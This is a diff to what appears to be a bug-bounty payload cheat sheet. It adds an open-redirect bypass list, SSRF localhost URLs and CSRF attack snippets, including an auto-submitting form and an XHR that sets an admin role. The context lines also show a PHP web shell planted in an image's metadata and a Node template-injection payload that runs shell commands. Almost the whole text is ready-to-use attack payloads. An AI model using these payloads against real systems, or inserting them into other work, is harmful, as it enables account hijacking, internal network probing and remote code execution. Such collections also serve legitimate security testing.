@@ -18,9 +18,13 @@
 
 ### BugBounty
   - [Bypass file upload filtering](#bypass-file-upload-filtering)
-  - [XSS](#xxe-common-payloads)
+  - [Open redirect](#open-web-redirect)
+  - [PHP filter](#php-filters-for-lfi)
+  - [XSS](#xss-common-payloads)
   - [XXE](#xxe-common-payloads)
   - [SSTI](#server-side-template-injection-ssti-to-rce)
+  - [SSRF](#ssrf-common-payloads)
+  - [CSRF](#csrf-common-payloads)
   - [LFI](#local-file-inclusion-lfi-payloads)
   - [RFI](#remote-file-inclusion-rfi)
   - [SQLI](#sql-injection-payload-list)
@@ -55,6 +59,54 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
 ```
+-------------------------------------------------------------------------------------------------------------
+# Open web redirect
+
+### Open web redirect common payloads
+```
+/%09/example.com
+/%2f%2fexample.com
+/%2f%2f%2fbing.com%2f%3fwww.omise.co
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%5cexample.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+/.example.com
+//%09/example.com
+//%5cexample.com
+///%09/example.com
+///%5cexample.com
+////%09/example.com
+////%5cexample.com
+/////example.com
+/////example.com/
+////\;@example.com
+////example.com/
+////example.com/%2e%2e
+////example.com/%2e%2e%2f
+////example.com/%2f%2e%2e
+////example.com/%2f..
+////example.com//
+///\;@example.com
+///example.com
+///example.com/
+//google.com/%2f..
+//www.whitelisteddomain.tld@google.com/%2f..
+///google.com/%2f..
+///www.whitelisteddomain.tld@google.com/%2f..
+////google.com/%2f..
+////www.whitelisteddomain.tld@google.com/%2f..
+https://google.com/%2f..
+https://www.whitelisteddomain.tld@google.com/%2f..
+/https://google.com/%2f..
+/https://www.whitelisteddomain.tld@google.com/%2f..
+//www.google.com/%2f%2e%2e
+//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+```
+#### [source](https://github.com/payloadbox/open-redirect-payload-list)
 -------------------------------------------------------------------------------------------------------------
 
 # XSS common payloads
@@ -156,7 +208,79 @@ uid=0(root) gid=0(root) groups=0(root)
 ```python
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
 ```
+--------------------------------------------------------------------------------
+# SSRF common payloads
+```
+http://127.0.0.1:80
+```
+```
+http://127.0.0.1:443
+```
+```
+http://127.0.0.1:22
+```
+```
+http://0.0.0.0:80
+```
+```
+http://0.0.0.0:443
+```
+```
+http://0.0.0.0:22
+```
+--------------------------------------------------------------------------------
 
+# CSRF common payloads
+
+### On click submit - HTML GET
+```html
+<a href="http://www.example.com/api/setusername?username=CSRF">Click Me</a>
+```
+### Auto submit - HTML GET
+```html
+<img src="http://www.example.com/api/setusername?username=CSRF">
+```
+### On click submit - HTML POST
+
+```html
+<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="username" type="hidden" value="CSRF" />
+ <input type="submit" value="Submit Request" />
+</form>
+```
+### Auto submit - HTML POST
+```html
+<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="username" type="hidden" value="CSRFd" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
+```
+### JSON GET
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+</script>
+```
+### JSON POST
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+//application/json is not allowed in a simple request. text/plain is the default
+xhr.setRequestHeader("Content-Type", "text/plain");
+//You will probably want to also try one or both of these
+//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+xhr.send('{"role":admin}');
+</script>
+```
+#### [source](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
 --------------------------------------------------------------------------------
 
 # Remote File Inclusion (RFI)
